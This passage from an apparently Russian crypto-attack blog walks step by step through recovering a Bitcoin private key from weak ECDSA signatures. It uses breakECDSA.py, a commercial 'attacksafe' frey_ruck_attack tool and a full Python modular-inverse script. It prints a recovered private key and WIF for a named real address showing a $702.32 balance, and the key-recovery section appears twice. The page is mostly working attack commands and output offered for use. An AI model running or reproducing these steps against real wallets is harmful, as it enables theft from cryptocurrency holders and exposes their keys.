N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xb1f4054cff1df58822bb4085f7fb23c95c37bdd037dc1df01be68a8ca85f6d55
R = 0x2bf4a846fe0d4c967c15a90eb56365576e42563b7257cbc280def5936817ec4e
S = 0x54cb84ac0ce9a6e2e4cbc22f814f1d83c4ef04d55da730761d202158bdb69058
Z = 0x4af38c561f0c46e2b0e78d5ab4aae0c82dc3f0affb15717064d8c63ee0c9330e


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-90.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1078"></figure>



<p><code>PrivKey = 4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
WIF:  KynJKoLwF9vk8yV5HaEybRcmjQhV938rjKt5kV6A7omrVipvk9ve
HEX:  4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a5.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-912"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac">https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-26-1024x444.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-914"><figcaption><strong><code>www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></strong></figcaption></figure>



<p><code>BALANCE: $ 702.32</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener">e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></strong></p><p><a href="https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-27-1024x97.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-917"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-91-1024x254.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1080"></figure>



<pre class="wp-block-code"><code>R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-92-1024x310.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1082"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-93-1024x453.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1084"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99

RawTX = 010000000133bfe125d6fc3f79b0dbd7f331b74bc48c622a40041cf1c5d12659d8cbac77b21f0000006b483045022100902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e022001bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc0121023a936a1116ee1d51eceef530daf519824a89a3985c9eaa1c58cfcd2c78830903ffffffff010000000000000000016a00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-94-1024x91.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1087"></figure>



<p><code>(0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e , 0x41034db92068cdccccf81bf9d103a8abe6f64f4df764b3fb2962fdf7ff86fa0d)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
point2gen  =   (0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e , 0x41034db92068cdccccf81bf9d103a8abe6f64f4df764b3fb2962fdf7ff86fa0d)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x0a27007da4d867c8ec6847cab32e8b8c38f5df48ec73847d355b4c7479970b99
R = 0x902909cb474b429661adaa481a872638e24c93d8bd61394f30d709c44d529c1e
S = 0x01bf247ad7e81871e9ee2acfc445c7716393e900ff7018727415fe3f553d6edc
Z = 0x74bd6032e6bfd019a0760d799efc145c34b9a5d58e9f974f9a60756890dc6288


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-95.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1089"></figure>



<p><code>PrivKey = 4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac
WIF:  KynJKoLwF9vk8yV5HaEybRcmjQhV938rjKt5kV6A7omrVipvk9ve
HEX:  4c708ac0c78e07552f14544758031d2ad9d0baee702b5b163b97f1e7200c007b</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a5.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-912"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac">https://www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-26-1024x444.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-914"><figcaption><strong><code>www.blockchain.com/btc/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac</code></strong></figcaption></figure>



<p><code>BALANCE: $ 702.32</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/14FreyRuckAttack" target="_blank" rel="noreferrer noopener">Source</a></strong></p>



<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">ATTACKSAFE SOFTWARE</a></strong></p>



<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">Telegram: https://t.me/cryptodeeptech</a></strong></p>



<p><strong><a href="https://youtu.be/wqHES7r1qyc" target="_blank" rel="noreferrer noopener">Video tutorial: https://youtu.be/wqHES7r1qyc</a></strong></p>



<p><strong><a href="https://cryptodeeptech.ru/frey-ruck-attack" target="_blank" rel="noreferrer noopener">Source: https://cryptodeeptech.ru/frey-ruck-attack</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/018-1024x576.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1100"></figure>



<p>&nbsp;</p>
	</div><!-- .entry-content -->




---


---


|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2gTnMpxRUNBU85Hg4ruTwnpUPKdf3nV |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
	
